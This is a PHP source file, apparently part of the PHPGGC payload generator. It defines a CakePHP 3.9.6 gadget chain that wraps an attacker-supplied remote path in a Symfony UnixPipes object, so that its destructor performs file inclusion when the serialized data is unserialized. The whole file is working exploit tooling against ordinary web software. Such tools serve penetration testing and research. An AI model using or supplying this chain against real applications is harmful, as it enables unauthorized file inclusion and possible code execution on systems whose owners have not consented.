<?php

namespace GadgetChain\CakePHP;

class FI1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '3.9.6';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'The path does not need end with the extension part (.php), and will use the ucfirst to process the path';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Symfony\Component\Process\Pipes\UnixPipes($file);
    }
}